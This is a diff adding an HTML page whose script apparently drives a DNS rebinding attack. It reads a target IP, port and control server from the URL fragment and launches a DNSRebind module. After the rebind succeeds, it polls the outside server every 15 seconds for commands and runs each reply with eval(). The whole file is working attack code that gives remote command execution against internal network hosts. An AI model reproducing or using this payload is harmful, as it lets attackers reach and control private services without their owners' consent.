@@ -1,0 +1,46 @@
+<html>
+<head>
+<script src="/js/script.js"></script>
+</head>
+<body>
+<script>
+var params = Misc.query2dict(location.hash.substr(1));
+
+function newCommand(xhr)	{
+	console.log(xhr);
+	if(xhr.status == 200)	{
+		eval(xhr.responseText);
+	}
+}
+
+function getCommands()	{
+	Network.request("GET", "http://" + params["server"] + "/new/commands/" + document.domain, null, newCommand);
+	setTimeout(getCommands, 15000);
+}
+
+function callback(res)	{
+	console.log(res);
+	if(res == "success")	{
+		getCommands();
+	}
+	else	{
+		console.log("Unable to perform attack");
+	}
+}
+
+if("ip" in params && "port" in params || "server" in params)	{
+	var rebind = Misc.copy_module(DNSRebind);
+	rebind.ip = params["ip"];
+	rebind.port = params["port"];
+	rebind.server = params["server"];
+	rebind.finished = callback;
+
+	rebind.start();
+}
+else	{
+	console.log("Unable to find ip, port and server in parameters");
+}
+</script>
+</body>
+</html>
+
